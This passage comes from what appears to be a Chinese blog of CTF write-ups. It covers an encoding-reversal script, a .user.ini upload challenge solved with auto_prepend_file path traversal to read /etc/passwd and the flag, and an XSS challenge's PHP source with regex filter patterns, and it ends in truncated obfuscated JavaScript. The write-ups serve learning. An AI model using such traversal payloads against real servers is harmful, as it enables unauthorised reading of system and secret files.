punctuation">(</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"U+</span><span class="token interpolation"><span class="token punctuation">{</span>code_point<span class="token punctuation">:</span><span class="token format-spec">04X</span><span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> char<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span> <span class="token keyword">continue</span> <span class="token keyword">return</span> candidates ascii_character <span class="token operator">=</span> <span class="token string">"j"</span>  <span class="token comment"># "s","p" </span>byte_val <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>ascii_character<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Possible original characters (</span><span class="token interpolation"><span class="token punctuation">{</span>byte_val<span class="token punctuation">}</span></span><span class="token string"> → 0x</span><span class="token interpolation"><span class="token punctuation">{</span>byte_val <span class="token operator">&amp;</span> <span class="token number">0xFF</span><span class="token punctuation">:</span><span class="token format-spec">02X</span><span class="token punctuation">}</span></span><span class="token string">）:"</span></span><span class="token punctuation">)</span> results <span class="token operator">=</span> reverse_search<span class="token punctuation">(</span>byte_val<span class="token punctuation">)</span> <span class="token keyword">for</span> cp<span class="token punctuation">,</span> char<span class="token punctuation">,</span> name <span class="token keyword">in</span> results<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>cp<span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>char<span class="token punctuation">}</span></span><span class="token string"> - </span><span class="token interpolation"><span class="token punctuation">{</span>name<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/64b88b0c1be2aa1d78f952461ef4e113.png"></p><p>另外，其实选手如果有心注意的话，在jtar的github项目里有一条23年的pr（最上 方），是关于中文编码错误的修改（但并未被合并），可以作为一条潜在的hint，提醒 选手关注jtar的编码问题。       </p><hr>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>黄河&amp;Litctf</title>
      <link href="/2025/05/25/hh/"/>
      <url>/2025/05/25/hh/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/LAMENTXU/articles/18894779">https://www.cnblogs.com/LAMENTXU/articles/18894779</a></p><h3 id="奶龙牌图片处理器2-0"><a href="#奶龙牌图片处理器2-0" class="headerlink" title="奶龙牌图片处理器2.0"></a>奶龙牌图片处理器2.0</h3><p>先试了一下，但思路一直是想办法绕过php借.use.ini上传木马在/uploads/index.php上显示，但怎么也不行。后来从佳秦学长那里了解到.use.ini还有路径穿越的功能。</p><p>先试了<code>auto_prepend_file=../../../../../../etc/passwd</code>，发现可以，于是再用<code>auto_prepend_file=../../../../../../flag</code>即可。</p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/0ff91ef40fc05dae732a35691d1420b6.png"></p><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/7eff5656a87a976bd8296d7016779a8c.png"></p><hr><h3 id="外国山海经"><a href="#外国山海经" class="headerlink" title="外国山海经"></a>外国山海经</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php">#shu.php  sha.php  wa.php  flag.php  flag.php.swp<span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Security-Policy: default-src 'self';"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">validate_params</span><span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span> <span class="token variable">$max</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">global</span> <span class="token variable">$content</span><span class="token punctuation">;</span>    <span class="token variable">$raw</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$method</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'QUERY_STRING'</span><span class="token punctuation">]</span>        <span class="token punctuation">:</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">parse_str</span><span class="token punctuation">(</span><span class="token variable">$raw</span><span class="token punctuation">,</span> <span class="token variable">$params</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$params</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token variable">$max</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span><span class="token operator">=</span><span class="token string double-quoted-string">"参数多了！"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token variable">$pattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/(?:^|&amp;)(\w+)(?:=|&amp;|$)/'</span><span class="token punctuation">;</span>    <span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$raw</span><span class="token punctuation">,</span> <span class="token variable">$matches</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token variable">$duplicates</span> <span class="token operator">=</span> <span class="token function">array_diff_assoc</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">array_unique</span><span class="token punctuation">(</span><span class="token variable">$matches</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">http_response_code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$content</span><span class="token operator">=</span><span class="token string double-quoted-string">"有重复的，不准"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filters</span> <span class="token operator">=</span> <span class="token punctuation">[</span>   <span class="token string single-quoted-string">'/&lt;script\b[^&lt;]*(?:(?!&lt;\/script&gt;)&lt;[^&lt;]*)*&lt;\/script&gt;/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'/on\w+\s*=\s*(["\']).*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'/(?:href|src)\s*=\s*(["\'])\s*javascript:.*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'/(?:href|src)\s*=\s*(["\'])\s*data:.*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'/style\s*=\s*(["\']).*?expression\([^&gt;]*?\).*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'/&lt;\/?(?:iframe|object|embed|link|img|meta|base|source|form|input|video|audio|textarea|button|frame|frameset|applet)[^&gt;]*?&gt;/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'/\b(?:style|srcset|formaction|xlink:href|contenteditable|xmlns)\s*=\s*(["\']).*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>  <span class="token string single-quoted-string">'/(?:href|src)\s*=\s*(["\'])(?:\s*javascript:|vbscript:|file:|data:|filesystem:).*?\1/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">,</span>   <span class="token string single-quoted-string">'/\b(?:eval|prompt|confirm|console\.log|Function)\s*\(/is'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'[no!no!no!]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$filters</span> <span class="token keyword">as</span> <span class="token variable">$pattern</span> <span class="token operator">=&gt;</span> <span class="token variable">$replacement</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$content</span><span class="token operator">?</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$pattern</span><span class="token punctuation">,</span> <span class="token variable">$replacement</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">validate_params</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'GET'</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">validate_params</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'POST'</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$content</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;h3 align=center&gt;payload的长度:"</span><span class="token operator">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/h3&gt;"</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">_0x5bfa63<span class="token punctuation">,</span>_0x281ba4</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x628a90<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x28e595</span><span class="token operator">:</span><span class="token number">0x190</span><span class="token punctuation">,</span><span class="token literal-property property">_0x466706</span><span class="token operator">:</span><span class="token number">0x17a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x570276</span><span class="token operator">:</span><span class="token number">0x192</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4e238d</span><span class="token operator">:</span><span class="token number">0x128</span><span class="token punctuation">,</span><span class="token literal-property property">_0xf7fd91</span><span class="token operator">:</span><span class="token number">0x139</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4ff7de</span><span class="token operator">:</span><span class="token number">0x144</span><span class="token punctuation">,</span><span class="token literal-property property">_0xf17c9a</span><span class="token operator">:</span><span class="token number">0x132</span><span class="token punctuation">,</span><span class="token literal-property property">_0x140c6f</span><span class="token operator">:</span><span class="token number">0x117</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2e9d5d</span><span class="token operator">:</span><span class="token number">0x124</span><span class="token punctuation">,</span><span class="token literal-property property">_0x27ecfb</span><span class="token operator">:</span><span class="token number">0x16f</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1f08ae</span><span class="token operator">:</span><span class="token number">0x16e</span><span class="token punctuation">,</span><span class="token literal-property property">_0x429bb1</span><span class="token operator">:</span><span class="token number">0x185</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5259a4</span><span class="token operator">:</span><span class="token number">0x186</span><span class="token punctuation">,</span><span class="token literal-property property">_0xf069bc</span><span class="token operator">:</span><span class="token number">0xfc</span><span class="token punctuation">,</span><span class="token literal-property property">_0x36775b</span><span class="token operator">:</span><span class="token number">0xda</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1a81bc</span><span class="token operator">:</span><span class="token number">0x101</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4fbeb3</span><span class="token operator">:</span><span class="token number">0x159</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5f0ac4</span><span class="token operator">:</span><span class="token number">0x16a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x2b1d0c</span><span class="token operator">:</span><span class="token number">0x15f</span><span class="token punctuation">,</span><span class="token literal-property property">_0x45b6b4</span><span class="token operator">:</span><span class="token number">0x160</span><span class="token punctuation">,</span><span class="token literal-property property">_0x542167</span><span class="token operator">:</span><span class="token number">0x17c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x300668</span><span class="token operator">:</span><span class="token number">0x15a</span><span class="token punctuation">,</span><span class="token literal-property property">_0x5d82fc</span><span class="token operator">:</span><span class="token number">0x13b</span><span class="token punctuation">,</span><span class="token literal-property property">_0x4fc9cc</span><span class="token operator">:</span><span class="token number">0x176</span><span class="token punctuation">,</span><span class="token literal-property property">_0x1f53f0</span><span class="token operator">:</span><span class="token number">0x146</span><span class="token punctuation">,</span><span class="token literal-property property">_0x99afde</span><span class="token operator">:</span><span class="token number">0xfe</span><span class="token punctuation">,</span><span class="token literal-property property">_0x39b153</span><span class="token operator">:</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token literal-property property">_0xed7676</span><span class="token operator">:</span><span class="token number">0xef</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3a214b</span><span class="token operator">:</span><span class="token number">0x10c</span><span class="token punctuation">,</span><span class="token literal-property property">_0x18fd83</span><span class="token operator">:</span><span class="token number">0x115</span><span class="token punctuation">,</span><span class="token literal-property property">_0x44ec87</span><span class="token operator">:</span><span class="token number">0x166</span><span class="token punctuation">,</span><span class="token literal-property property">_0x3009e4</span><span class="token operator">:</span><span class="token number">0x163</span><span class="token punctuation">,</span><span class="token literal-property property">_0x362ea9</span><span class="token operator">:</span><span class="token number">0x170</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0x28823e<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x456064</span><span class="token operator">:</span><span class="token number">0x20a</span><span class="token punctuation">}</span><span class="token punctuation">,</span>_0xb2ea4e<span class="token operator">=</span><span class="token punctuation">{</span><span class="token literal-property property">_0x332eb1</span><span class="token operator">:</span><span class="token number">0x262</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token parameter">_0x372bcf<span class="token punctuation">,</span>_0x587d2c<span class="token punctuation">,</span>_0x343524<span class="token punctuation">,</span>_0x7ab981</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x7ab981<span class="token operator">-</span> <span class="token operator">-</span>_0xb2ea4e<span class="token punctuation">.</span>_0x332eb1<span class="token punctuation">,</span>_0x343524<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">var</span> _0x19cd46<span class="token operator">=</span><span class="token function">_0x5bfa63</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token parameter">_0x65cbe3<span class="token punctuation">,</span>_0x1b7dab<span class="token punctuation">,</span>_0x513f23<span class="token punctuation">,</span>_0x2e4568</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">_0x2fa2</span><span class="token punctuation">(</span>_0x65cbe3<span class="token operator">-</span> <span class="token operator">-</span>_0x28823e<span class="token punctuation">.</span>_0x456064<span class="token punctuation">,</span>_0x2e4568<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">try</span><span class="token punctuation">{</span><span class="token keyword">var</span> _0x27e61b<span class="token operator">=</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x18e</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x28e595<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x466706<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x570276<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0x1f33</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0xda2</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x1190</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x4e238d<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0xf7fd91<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x4ff7de<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0xf17c9a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x97e</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token operator">+</span><span class="token number">0x8</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x98</span><span class="token operator">+</span><span class="token number">0x25f</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x10d</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x140c6f<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x111</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x2e9d5d<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x115</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0xa</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x63b</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x24a</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x27ecfb<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x1f08ae<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x429bb1<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x5259a4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x95</span><span class="token operator">+</span><span class="token number">0x6c0</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x627</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0xf069bc<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x36775b<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x1a81bc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0x14ca</span><span class="token operator">+</span><span class="token number">0xf94</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x2459</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x4fbeb3<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x151</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x5f0ac4<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x167</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0x11ed</span><span class="token operator">+</span><span class="token number">0x1133</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x118d</span><span class="token operator">*</span><span class="token number">0x2</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x2b1d0c<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x45b6b4<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x542167<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x300668<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0x1d5</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x6</span><span class="token operator">+</span><span class="token number">0x1</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x6dd</span><span class="token operator">+</span><span class="token number">0x11e2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x5d82fc<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x4fc9cc<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x1f53f0<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x157</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x475</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x172a</span><span class="token operator">+</span><span class="token number">0x1ba7</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x99afde<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x39b153<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0xed7676<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xde</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0x1caa</span><span class="token operator">+</span><span class="token number">0x8ed</span><span class="token operator">+</span><span class="token number">0xd1</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x2e</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x180c55</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x3a214b<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x119</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0xee</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x18fd83<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x687</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x7c8</span><span class="token operator">+</span><span class="token number">0xe59</span><span class="token operator">*</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0x16c</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x179</span><span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x44ec87<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x3009e4<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">0xdba</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x2</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x21bd</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0xc</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x87</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">parseInt</span><span class="token punctuation">(</span><span class="token function">_0x5afd48</span><span class="token punctuation">(</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x362ea9<span class="token punctuation">,</span><span class="token operator">-</span>_0x628a90<span class="token punctuation">.</span>_0x3009e4<span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x174</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">0x182</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token punctuation">(</span><span class="token number">0xc54</span><span class="token operator">+</span><span class="token operator">-</span><span class="token number">0x91</span><span class="token operator">*</span><span class="token number">0x1</span><span class="token operator">+</span><span class="token number">0xbb7</span><span class="token operator">*</span><span class="token operator">-</span><span class="token number">0x1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>_0x27e61b<span class="token operator">===</span>_0x281ba4<span class="token punctuation">)</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">else</span> _0x19cd46<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x19cd46<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>_0x412f22<span class="token punctuation">)</span><span class="token punctuation">{</span>_0x19cd46<span class="token punctuation">[</span><span class="token string">'push'</span><span class="token punctuation">]</span><span class="token punctuation">(</span>_0x19cd46<span class="token punctuation">[</span><span class="token string">'shift'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">(</span>_0x219d<span 